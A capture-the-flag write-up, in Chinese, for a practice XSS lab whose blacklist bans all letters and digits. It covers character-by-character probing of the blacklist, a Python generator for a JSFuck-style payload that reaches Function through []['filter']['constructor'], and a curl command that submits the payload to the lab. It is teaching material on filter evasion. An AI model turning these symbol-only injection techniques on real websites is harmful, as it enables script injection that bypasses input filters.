## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 32 关
（样式表 `static/css/xss/xss32.css`，标题 `Dalgona - Umbrella`，图标是伞）。

首页入口 `Page` → `GET /page`，表单是 **POST**：

```html
<form class="box-form" method="post">
  <div class="solution-text"><script> var name = ""; document.write('Hello ' + name); </script></div>
  <textarea name=name cols=50 rows=20 placeholder="Enter your name..."></textarea>
</form>
```

关键：**输入落在 `<script>` 内的 JS 字符串里**（`var name = "…";`），不是 HTML 文本节点。

### 关键观察

**1. 黑名单覆盖全部字母和数字。**

逐字符探测（每个可打印 ASCII 单独提交一次）：

```text
banned: 0-9 a-z A-Z < >
allowed: ! " # $ % & ' ( ) * + , - . / : ; = ? @ [ \ ] ^ _ ` { | } ~ 空格
```

- 连单个 `a`、`e` 都会被拦，返回 `Sorry you can't use: 'a'`。
- `<` `>` 也被拦，所以不能走 HTML 注入。
- 但 `[]()!+` 这套符号全部可用——**这正是 JSFuck 的字符集**。

**2. 判据与同组 XSS 题一致。**

```text
Sorry you can't use: '<token>'                 黑名单
Oops! You did an alert with TypeError: ... instead of "XSS"   触发了但参数不对
Congratulations!<p> Here is the flag: flag{...}               成功
```

要求调用 `alert` 且参数严格等于字符串 `"XSS"`。由于字母被全禁，
`"XSS"` 只能**在运行时构造**。

**3. 没有长度限制。**

测试到 8000 字符仍正常回显（响应 17 249 字节），所以可以用长 payload。

### 利用链

用纯符号构造：

```javascript
[]["filter"]["constructor"](
  "alert(unescape(\"%58%53%53\"))"
)()
```

思路：

1. 先闭合字符串：payload 以 `";` 开头，以 `//` 结尾（注释掉模板剩下的 `"; document.write(...)`）。
2. `[]["filter"]` 拿到一个函数（**属性名用符号拼出来**，不允许出现字面字母）。
3. `["constructor"]` 拿到 `Function`，用它把代码字符串编译执行。
4. 代码字符串 `alert(unescape("%58%53%53"))` 中的字母全部由符号表达式拼出；
   `%58%53%53` 是 `"XSS"` 的百分号编码，其中的数字 `58`/`53` 用
   `+!+[]`（即 `1`）累加得到，再用 `[]+数字` 转成十进制字符串。
5. `unescape` 把 `%58%53%53` 还原成 `"XSS"`——**这一步避开了"无法直接写出大写 X"的问题**。

实际生成器（Python）：

```python
def idx(k):                     # 数字 k 的符号表达式
    return '+[]' if k == 0 else '+!+[]' + '+!+[]'*(k-1)

Fs = '(![]+[])'      # "false"      -> f a l s e
Ts = '(!![]+[])'     # "true"       -> t r u e
Us = '([][[]]+[])'   # "undefined"  -> u n d e f i n e d

c_f = f'{Fs}[{idx(0)}]'   # 'f'
c_i = f'{Us}[{idx(5)}]'   # 'i'
c_l = f'{Fs}[{idx(2)}]'   # 'l'
c_t = f'{Ts}[{idx(0)}]'   # 't'
c_e = f'{Fs}[{idx(4)}]'   # 'e'
c_r = f'{Ts}[{idx(1)}]'   # 'r'

# "filter" 完全由上面的字符拼出，再用它取到函数源码，从而补出 'c' 和 'o'
str_filter = '(' + '+'.join([c_f, c_i, c_l, c_t, c_e, c_r]) + ')'
Fsrc = f'([][{str_filter}]+[])'          # "function filter() { [native code] }"
c_c, c_o = f'{Fsrc}[{idx(3)}]', f'{Fsrc}[{idx(6)}]'

# "constructor" -> 用它取 RegExp 的源码，从而补出 'p'
str_ctor = '(' + '+'.join([c_c, c_o, f'{Us}[{idx(1)}]', f'{Fs}[{idx(3)}]',
                           c_t, c_r, f'{Ts}[{idx(2)}]', c_c, c_t, c_o, c_r]) + ')'
Rsrc = f'((/(?:)/)[{str_ctor}]+[])'      # "function RegExp() { [native code] }"
c_p = f'{Rsrc}[{idx(14)}]'               # 'p'  <- 正则字面量 /(?:)/ 只用符号

str_alert = '(' + '+'.join([f'{Fs}[{idx(1)}]', c_l, c_e, c_r, c_t]) + ')'          # "alert"
str_unesc = '(' + '+'.join([f'{Ts}[{idx(2)}]', f'{Us}[{idx(1)}]', c_e,
                            f'{Fs}[{idx(3)}]', c_c, f'{Fs}[{idx(1)}]', c_p, c_e]) + ')'  # "unescape"

def num(n):  return '+!+[]' + '+!+[]'*(n-1)
def dec(n):  return f'([]+({num(n)}))'   # "" + n -> "58"
```

拼出：

```javascript
EXPR = [][filter][constructor]("alert(unescape(\"%58%53%53\"))")()
payload = '";' + EXPR + '//'
```

最终 payload **3 178 字符**，字符集检查：

```text
illegal chars: NONE      # 无 0-9 / a-zA-Z / < >
```

本地用 node 验证（`global.alert = s => console.log(s)`）得到 `ALERT=[XSS]`，
再原样发给靶场。

```bash
curl -sS -X POST --data-urlencode "name@/tmp/final_payload.txt" http://$T/page \
| grep -o 'flag{[^}]*}'
```

## 复盘

- **先做字符级探测，再决定路线。** 逐个提交 94 个可打印字符，一次就得到完整的
  黑名单（`0-9 a-z A-Z < >`）。这比逐个猜 payload 快一个数量级，
  而且直接告诉你"只能用符号"→ JSFuck。
- **"不能写字面字母" ≠ "不能用那几个内置对象"。** 属性名可以用符号拼出来的字符串
  （`[][("f"+"i"+"l"+"t"+"e"+"r")]`），所以 `filter` / `constructor` / `alert` / `unescape`
  全都能表达。
- **构造大写字母的最短路径是 `unescape("%..")`。** 大写 `X` 在
  `false/true/undefined/NaN/Infinity/function X` 这些原始串里都不存在，
  `toUpperCase` 需要 `U`/`C`、`fromCharCode` 需要 `C`，都会绕回同一个鸡生蛋问题。
  改用百分号编码 + `unescape` 就完全绕开了这件事：`%` 和数字都能造。
- **数字比字母容易。** `!+[]` 是 `true`（1），`!+[]+!+[]` 是 2，`[]+(数字)` 得到十进制字符串。
  所以 `58`/`53` 直接用累加构造，不需要 `toString`。
- **`/(?:)/` 是纯符号的正则字面量**，用来拿到 `RegExp` 源码，从而补出最后缺的字母 `p`
  （`unescape`、`escape`、`prototype` 都需要 `p`，而其他内置函数名里没有）。
  这是整个构造里最关键的一步。
- **本地验证是必须的。** 3 000 多字符的符号表达式不可能手写正确；
  用 node 打桩跑一遍确认 `ALERT=[XSS]`，再去打靶场，能避免在目标上反复试错
  （靶场每次都跑 headless 浏览器，成本高）。
- **先闭合字符串再注入。** `";` 开头 + `//` 结尾，把模板后面的
  `"; document.write('Hello ' + name);)` 注释掉。`//` 只吃到行尾，但 HTML 解析器
  仍会按字面找到 `</script>`，所以不会破坏页面结构。
